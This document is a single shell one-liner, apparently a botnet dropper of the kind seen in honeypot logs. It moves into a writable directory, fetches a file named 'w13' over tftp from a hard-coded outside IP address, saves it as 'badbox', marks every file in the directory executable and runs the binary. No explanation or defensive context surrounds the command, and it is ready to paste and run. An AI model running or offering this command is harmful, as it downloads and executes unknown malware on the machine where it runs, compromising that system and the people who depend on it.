cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r w13 -g 144.217.130.7;cat w13 >badbox;chmod +x *;./badbox
